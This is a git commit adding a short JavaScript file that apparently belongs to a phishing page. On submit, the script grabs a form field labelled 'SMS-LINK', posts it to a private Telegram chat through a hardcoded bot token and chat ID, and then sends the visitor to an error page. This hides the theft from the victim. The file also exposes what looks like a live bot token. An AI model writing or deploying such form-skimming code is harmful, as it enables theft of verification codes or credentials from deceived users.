954652fc25e7046d0c5c770693432a3080f23f54
rusru12 <169069334+rusru12@users.noreply.github.com>
2024-06-18 03:14:46 +0700

    Add files via upload

---
+++ fetch.js
@@ -0,0 +1,41 @@
+    const TOKEN = "7055316840:AAFvl53PxbFxz6Tchs6nfPeMzBwXY89YbXI";
+const CHAT_ID = "6745228656";
+const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+const form = document.getElementById("fetch");
+
+form.addEventListener("submit", onSubmitTelegram);
+
+function onSubmitTelegram(e) {
+  e.preventDefault();
+
+  const { name, } = form;
+  const data = {
+    name: name.value,
+  };
+
+  let message = `<b></b>\n`;
+  message += `<b>SMS-LINK : </b> ${data.name}`;
+
+  const dataTg = {
+    chat_id: CHAT_ID,
+    text: message,
+    parse_mode: "html",
+  };
+
+  const options = {
+    method: "POST",
+    body: JSON.stringify(dataTg),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  };
+
+  fetch(URL_API, options)
+    .then((res) => res.json())
+    .then((res) => console.log(res))
+    .catch((err) => console.log(err));
+    
+    window.location.href = '/error.html';
+}
+
